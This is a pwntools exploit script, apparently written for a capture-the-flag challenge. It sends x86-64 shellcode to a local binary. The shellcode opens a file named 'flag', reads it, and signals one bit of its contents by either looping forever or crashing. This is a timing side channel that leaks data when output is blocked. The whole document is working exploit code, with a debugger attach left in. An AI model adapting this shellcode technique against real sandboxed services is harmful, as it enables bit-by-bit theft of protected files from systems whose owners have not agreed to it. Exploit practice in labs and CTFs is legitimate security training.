from pwn import *
context.arch = 'amd64'
r=process("./shellcode")
gdb.attach(r)
pause()
offset='0'
bit='0'
shellcode = asm(f'''
lea rdi, [rip+flag];
xor rsi, rsi;   
mov rax, 2;
syscall;         
cmp rax, 0;
jl exit;       
mov rdi, rax;    
sub rsp, 0x100;  
mov rsi, rsp;    
mov rdx, 0x100; 
xor rax, rax;    
syscall;
mov al, byte ptr [rsi+{offset}];
shr al, {bit};
and al, 1;
test al, al;
    jz exit;         
loop:
    jmp loop;        
exit:
    ud2;            
flag:
    .string "flag";
''')
r.send(shellcode)
r.interactive()

